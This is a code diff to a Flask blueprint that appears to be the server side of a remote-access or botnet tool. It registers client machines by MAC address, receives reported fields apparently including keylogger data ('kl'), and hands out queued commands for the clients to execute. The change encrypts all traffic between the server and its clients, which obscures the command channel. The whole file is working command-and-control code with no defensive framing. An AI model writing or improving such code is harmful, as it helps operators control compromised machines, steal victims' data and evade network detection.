@@ -1,7 +1,7 @@
 from flask import Blueprint, request, render_template_string, session, redirect, url_for, send_from_directory, jsonify, Response
 from datetime import datetime
 import os, time, json, threading
-from core import clients_db, save_db, is_online, log_login_attempt, USERNAME, PASSWORD, UPDATE_DIR, VERSION_FILE
+from core import clients_db, save_db, is_online, log_login_attempt, USERNAME, PASSWORD, UPDATE_DIR, VERSION_FILE, encrypt_data, decrypt_data
 
 bp = Blueprint('main', __name__)
 
@@ -13,10 +13,10 @@ def api_ping(mac):
 
 @bp.route('/report', methods=['GET'])
 def report_client():
-    mac = request.args.get('mac')
-    ver = request.args.get('ver')
-    fg = request.args.get('fg', '')
-    kl = request.args.get('kl', '')
+    mac = decrypt_data(request.args.get('mac', ''))
+    ver = decrypt_data(request.args.get('ver', ''))
+    fg = decrypt_data(request.args.get('fg', ''))
+    kl = decrypt_data(request.args.get('kl', ''))
     if mac and ver:
         time_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         if mac not in clients_db:
@@ -37,14 +37,14 @@ def report_client():
             if pending_file_cmd:
                 clients_db[mac]['pending_file_cmd'] = ''
                 save_db()
-                return pending_file_cmd, 200
+                return encrypt_data(pending_file_cmd), 200
 
             # 如果有缓存的待执行命令，通过心跳返回让客户端去执行
             pending_cmd = clients_db[mac].get('pending_cmd', '')
             if pending_cmd:
                 clients_db[mac]['pending_cmd'] = '' # 下发后清空，只下发一次
                 save_db()
-                return pending_cmd, 200
+                return encrypt_data(pending_cmd), 200
 
             if i % 10 == 0:
                 clients_db[mac]["last_seen"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
@@ -55,7 +55,7 @@ def report_client():
         # 循环结束前刷新最后心跳时间
         clients_db[mac]["last_seen"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         save_db()
-        return "SSID:" + clients_db[mac].get('name', '未命名设备'), 200
+        return encrypt_data("SSID:" + clients_db[mac].get('name', '未命名设备')), 200
 
     return "Missing parameters", 400
 
